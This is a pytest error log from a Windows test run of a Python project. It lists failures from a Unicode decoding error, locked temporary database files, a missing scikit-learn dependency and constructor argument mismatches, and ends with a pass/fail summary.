ERROR tests/test_yaml_conversion.py::TestYAMLConversion::test_slash_commands_structure - UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 5798: character maps to <undefined>
ERROR tests/test_yaml_conversion.py::TestYAMLConversion::test_no_duplicate_commands - UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 5798: character maps to <undefined>
ERROR tests/test_yaml_conversion.py::TestYAMLConversion::test_aliases_reference_valid_commands - UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 5798: character maps to <undefined>
ERROR tests/test_yaml_conversion.py::TestYAMLConversion::test_commands_have_operation_mapping - UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 5798: character maps to <undefined>
ERROR tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_file_entities - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmppdpzlstw.db'
ERROR tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_class_entities - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmphulydajn.db'
ERROR tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_method_entities - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpg6pmfxlg.db'
ERROR tests/tier1/entities/test_entity_extractor.py::TestExtractEntities::test_extract_multiple_entity_types - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpeseaca90.db'
ERROR tests/tier1/entities/test_entity_extractor.py::TestGetConversationEntities::test_get_entities_after_extraction - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmp6eppgz7x.db'
ERROR tests/tier1/entities/test_entity_extractor.py::TestGetConversationEntities::test_get_entities_empty_conversation - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmphzucchsd.db'
ERROR tests/tier1/entities/test_entity_extractor.py::TestGetEntityStatistics::test_get_statistics_includes_access_count - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpok7rvae3.db'
ERROR tests/tier1/entities/test_entity_extractor.py::TestGetEntityStatistics::test_get_statistics_empty_database - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmp582yyt91.db'
ERROR tests/tier1/fifo/test_queue_manager.py::TestEnforceFifoLimit::test_never_evicts_active_conversation - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpo_k8403w.db'
ERROR tests/tier1/messages/test_message_store.py::TestAddMessages::test_add_single_message - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpa3wiwkfj.db'
ERROR tests/tier1/messages/test_message_store.py::TestAddMessages::test_add_multiple_messages - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpqpfm6lrx.db'
ERROR tests/tier1/messages/test_message_store.py::TestAddMessages::test_add_messages_to_different_conversations - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmp83ttug44.db'
ERROR tests/tier1/messages/test_message_store.py::TestGetMessages::test_get_messages_preserves_order - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmptd5avx8h.db'
ERROR tests/tier1/messages/test_message_store.py::TestGetMessages::test_get_messages_empty_conversation - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpruw00x9h.db'
ERROR tests/tier1/messages/test_message_store.py::TestGetMessages::test_get_messages_includes_all_fields - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpxczeu6n2.db'
ERROR tests/tier1/messages/test_message_store.py::TestDeleteMessages::test_delete_removes_all_messages - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpdb41p1on.db'
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimizer_initialization - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimize_conversation_context_basic - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimize_with_few_conversations - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimize_with_empty_intent - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimize_with_empty_conversations - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_relevance_scoring - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_recency_boost - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_token_counting - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_quality_score_calculation - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimization_time - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimize_pattern_context_basic - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimize_patterns_below_limit - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_optimize_patterns_without_query - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_pattern_relevance_scoring - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_statistics_tracking - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_error_handling_fallback - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier1/test_ml_context_optimizer.py::TestMLContextOptimizer::test_none_conversation_content - ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
ERROR tests/tier2/knowledge_graph/test_database.py::TestDatabaseHealthCheck::test_health_check_detects_corrupted_database - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmptvktshsl\\test_kg_database.db'
ERROR tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_generator_initialization - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_generate_velocity_insights_no_data - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_generate_velocity_insights_with_data - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_generate_hotspot_insights_no_data - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_generate_hotspot_insights_with_data - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_generate_all_insights - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_insight_severity_assignment - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_insight_recommendations - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_empty_insights_handling - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_insight_data_structure - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/analysis/test_insight_generator.py::TestInsightGenerator::test_multiple_insight_types - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/metrics/test_file_metrics.py::TestFileMetricsAnalyzer::test_analyzer_initialization - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/metrics/test_file_metrics.py::TestFileMetricsAnalyzer::test_analyze_hotspots_basic - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/metrics/test_file_metrics.py::TestFileMetricsAnalyzer::test_save_and_retrieve_hotspots - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/metrics/test_file_metrics.py::TestFileMetricsAnalyzer::test_get_unstable_files - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/metrics/test_file_metrics.py::TestFileMetricsAnalyzer::test_churn_rate_filtering - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/metrics/test_file_metrics.py::TestFileMetricsAnalyzer::test_stability_classification - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/metrics/test_file_metrics.py::TestFileMetricsAnalyzer::test_force_analysis_flag - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/metrics/test_file_metrics.py::TestFileMetricsAnalyzer::test_date_range_filtering - TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_collector_initialization - TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_collect_metrics_empty_period - TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_save_and_retrieve_metrics - TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_get_metrics_date_filtering - TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_duplicate_metric_handling - TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_force_collection_flag - TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_aggregation_across_contributors - TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/metrics/test_git_metrics.py::TestGitMetricsCollector::test_get_metrics_with_specific_contributor - TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
ERROR tests/tier3/test_context_intelligence_integration.py::TestContextIntelligenceIntegration::test_full_system_initialization - TypeError: ContextIntelligence.__init__() takes from 1 to 2 positional arguments but 3 were given
ERROR tests/tier3/test_context_intelligence_integration.py::TestContextIntelligenceIntegration::test_end_to_end_git_metrics_workflow - TypeError: ContextIntelligence.__init__() takes from 1 to 2 positional arguments but 3 were given
ERROR tests/tier3/test_context_intelligence_integration.py::TestContextIntelligenceIntegration::test_end_to_end_file_hotspots_workflow - TypeError: ContextIntelligence.__init__() takes from 1 to 2 positional arguments but 3 were given
ERROR tests/tier3/test_context_intelligence_integration.py::TestContextIntelligenceIntegration::test_end_to_end_insights_workflow - TypeError: ContextIntelligence.__init__() takes from 1 to 2 positional arguments but 3 were given
ERROR tests/tier3/test_context_intelligence_integration.py::TestContextIntelligenceIntegration::test_refresh_all_functionality - TypeError: ContextIntelligence.__init__() takes from 1 to 2 positional arguments but 3 were given
ERROR tests/tier3/test_context_intelligence_integration.py::TestContextIntelligenceIntegration::test_get_summary_functionality - TypeError: ContextIntelligence.__init__() takes from 1 to 2 positional arguments but 3 were given
ERROR tests/tier3/test_context_intelligence_integration.py::TestContextIntelligenceIntegration::test_database_operations - TypeError: ContextIntelligence.__init__() takes from 1 to 2 positional arguments but 3 were given
ERROR tests/tier3/test_context_intelligence_integration.py::TestContextIntelligenceIntegration::test_multi_day_analysis_consistency - TypeError: ContextIntelligence.__init__() takes from 1 to 2 positional arguments but 3 were given
= 205 failed, 1769 passed, 37 skipped, 220 warnings, 124 errors, 5 subtests passed in 400.99s (0:06:40) =
